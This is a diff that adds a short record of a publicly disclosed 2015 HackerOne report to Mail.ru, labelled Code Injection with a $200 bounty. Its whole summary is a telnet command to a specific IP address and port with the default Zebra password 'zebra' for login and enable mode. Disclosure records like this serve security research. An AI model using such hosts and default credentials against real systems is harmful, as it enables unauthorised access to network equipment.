@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/62531
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:58:52
+
+Summary:
+
+telnet 185.5.138.229 2601
+
+Пароль zebra
+Пароль на enable -> zebra
